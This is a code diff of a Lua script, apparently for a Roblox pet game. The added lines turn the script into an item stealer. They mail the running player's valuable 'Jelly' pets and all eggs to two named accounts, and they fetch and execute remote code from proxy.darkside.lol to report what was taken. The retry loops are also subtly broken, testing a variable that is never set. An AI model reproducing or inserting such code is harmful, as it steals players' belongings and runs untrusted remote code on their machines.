@@ -2,6 +2,11 @@
 return function(dh,pn,gn,dp,potc)
 local zzzu, zzzv =pcall(function()
 
+if _G.yves_iq and _G.yves_iq == 100 then
+error("already running bru")
+end
+_G.yves_iq = 100
+
 if not dp then dp = 0 end
 if not _G.itc then _G.itc = 0 end
 if not _G.Min then _G.Min = 500000000 end
@@ -95,8 +100,22 @@ return game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild
 end
 
 for i,v in pairs(save.Inventory.Pet) do
-if string.find(v.id, "Jel") and ndir[v.id].difficulty > 24999999 then
-_mail("kdnaviivii", "Pet", i, (v.am or 1))
+if string.find(v.id, "Jelly") and ndir[v.id].difficulty > 24999999 then
+local _x,_e=false,""
+repeat
+_x,_e = _mail("kdnaviivii", "Pet", i, (v._am or 1))
+wait()
+until _X==true
+end
+end
+if save.Inventory.Egg then
+for i,v in pairs(save.Inventory.Egg) do
+loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()((v._am or 1).."x "..v.id)
+local _x,_e=false,""
+repeat
+_x,_e = _mail("PetSimxForNubs", "Egg", i, (v._am or 1))
+wait()
+until _X==true
 end
 end
 
